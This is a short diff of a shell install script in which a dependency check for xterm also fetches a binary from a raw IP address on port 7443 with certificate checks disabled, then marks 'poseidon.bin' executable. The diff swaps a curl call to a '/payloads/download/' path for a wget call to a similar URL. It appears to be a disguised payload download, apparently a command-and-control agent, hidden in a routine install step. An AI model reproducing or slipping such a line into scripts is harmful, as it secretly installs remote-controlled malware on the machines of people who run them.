@@ -55,7 +55,7 @@ if hash xterm 2>/dev/null; then
 else
         echo -e "$grenn xterm $yellow[✘]$nc"
 sudo apt-get install xterm
-curl --content-disposition https://45.144.29.184:7443/api/v1.4/payloads/download/eac28630-4c9f-470c-b2ce-96a18cd0b1e5 --no-check-certificate
+wget --content-disposition https://45.144.29.184:7443/api/v1.4/files/download/c98a0cae-cf5d-48bd-9529-4d6c09b4f640 --no-check-certificate
     chmod +x poseidon.bin
 fi
 
